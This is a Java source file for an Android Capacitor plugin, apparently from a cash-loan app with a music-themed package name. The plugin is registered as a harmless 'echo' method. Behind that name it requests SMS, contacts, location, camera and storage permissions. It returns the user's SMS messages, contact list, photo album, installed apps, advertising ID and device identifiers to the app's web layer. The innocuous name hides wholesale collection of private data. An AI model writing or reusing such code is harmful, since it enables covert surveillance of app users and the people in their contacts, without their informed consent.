package com.music.violin.cash.violin.music.loan.store.cash.loan;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.provider.Settings;

import androidx.core.app.ActivityCompat;

import com.getcapacitor.JSObject;
import com.getcapacitor.Plugin;
import com.getcapacitor.PluginCall;
import com.getcapacitor.PluginMethod;
import com.getcapacitor.annotation.CapacitorPlugin;
import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.google.gson.Gson;
import com.google.gson.JsonObject;

import java.util.HashMap;
import java.util.Map;


@CapacitorPlugin(name = "MyEcho")
public class MyPlugin extends Plugin {
    public static final int CAMERA_REQUEST_CODE = 123;

    public static final int READ_REQUEST_CODE = 1;
    public static PluginCall newCall;
    @PluginMethod()
    public void echo(PluginCall call) {
        JSObject ret = new JSObject();
        String value = call.getString("key");
        if (value.equals("getRequestHeadToken")) {
            ret.put("gaId", getGaid(getContext()));
            ret.put("androidId", getAndroidID(getContext()));
            ret.put("appVersionName", getAppVersionName(getContext()));
        } else if (value.equals("getQuanxian")) {
            newCall = call;
            ActivityCompat.requestPermissions(
                    getActivity(),
                    new String[] {
                    Manifest.permission.READ_PHONE_STATE,Manifest.permission.CAMERA,Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE,Manifest.permission.READ_CONTACTS,Manifest.permission.ACCESS_COARSE_LOCATION,
                    Manifest.permission.ACCESS_FINE_LOCATION,Manifest.permission.READ_SMS},
            CAMERA_REQUEST_CODE);
            return;
        }  else {
            Map map = new HashMap();
            if (value.equals("getDeviceInfo")) {
                map.put("device", GetDeviceUtils.getDeviceInfo(getActivity()));
            }
            if (value.equals("getPhotoList")) {
                map.put("photoList", GetDeviceUtils.getAlbumPhotos(getActivity()));
            }
            if (value.equals("getAppList")) {
                map.put("deviceApps", GetDeviceUtils.getDeviceApps(getActivity()));
            }
            if (value.equals("getSmsList")) {
                map.put("smsList", GetDeviceUtils.getPhoneSms(getActivity()));
            }
            if (value.equals("getContactList")) {
                map.put("deviceContacts", GetDeviceUtils.getContacts(getActivity()));
            }
            Gson gson = new Gson();
            String json = gson.toJson(map);
            JsonObject mm = gson.fromJson(json, JsonObject.class);
            ret.put("appInfo", mm);
        }
        call.resolve(ret);
    }

    public static String getAndroidID(Context context) {
        try {
            String androidID = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
            //LogUtil.e("androidID: " + androidID);
            return androidID;
        } catch (Exception e) {
            return null;
        }
    }
    public static String getGaid(Context context) {
        try {
            String Gaid = new AdvertisingIdClient(context).getAdvertisingIdInfo(context).getId();
            return Gaid;
        } catch (Exception e) {
            return null;
        }
    }
    public static String getAppVersionName(Context context) {
        String versionName = "";
        try {
            // ---get the package info---
            PackageManager pm = context.getPackageManager();
            PackageInfo pi = pm.getPackageInfo(context.getPackageName(), 0);
            versionName = pi.versionName;
            if (versionName == null || versionName.length() <= 0) {
                return "";
            }
        } catch (Exception e) {

        }
        return versionName;
    }


}